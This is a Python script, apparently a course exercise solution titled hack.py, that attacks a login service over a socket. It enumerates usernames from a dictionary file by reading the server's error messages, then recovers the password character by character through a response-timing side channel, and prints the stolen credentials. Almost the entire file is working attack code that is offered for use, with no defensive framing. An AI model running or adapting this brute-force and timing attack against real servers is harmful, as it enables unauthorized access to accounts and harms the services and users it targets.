import socket
import sys
import json
import string
import os
import time

def send_credentials(client_socket, login, password):
    credentials = {
        "login": login,
        "password": password
    }
    start_time = time.time()
    client_socket.send(json.dumps(credentials).encode())
    response = json.loads(client_socket.recv(1024).decode())
    end_time = time.time()
    
    return response["result"], end_time - start_time

def find_login(client_socket, logins):
    for login in logins:
        response, _ = send_credentials(client_socket, login, "")
        if response == "Wrong password!":
            return login
    return None

def find_password(client_socket, login):
    password = ""
    chars = string.ascii_letters + string.digits
    
    while True:
        found = False
        for char in chars:
            current_try = password + char
            response, response_time = send_credentials(client_socket, login, current_try)
            
            if response == "Connection success!":
                return current_try
            
            if response_time > 0.1:  # Server delay threshold
                password = current_try
                found = True
                break
        
        if not found:
            return None

def load_logins():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(script_dir, 'logins.txt'), 'r') as f:
            return [line.strip() for line in f]
    except FileNotFoundError:
        print("Login dictionary file not found!")
        sys.exit(1)

def hack_server(ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((ip, int(port)))
        
        logins = load_logins()
        
        correct_login = find_login(client_socket, logins)
        if not correct_login:
            print("Login not found!")
            return
        
        correct_password = find_password(client_socket, correct_login)
        if not correct_password:
            print("Password not found!")
            return
        
        result = {
            "login": correct_login,
            "password": correct_password
        }
        print(json.dumps(result, indent=4))
        
    except socket.error as e:
        print(f"Connection error: {e}")
    finally:
        client_socket.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python hack.py <ip> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    hack_server(ip, port)

if __name__ == "__main__":
    main()
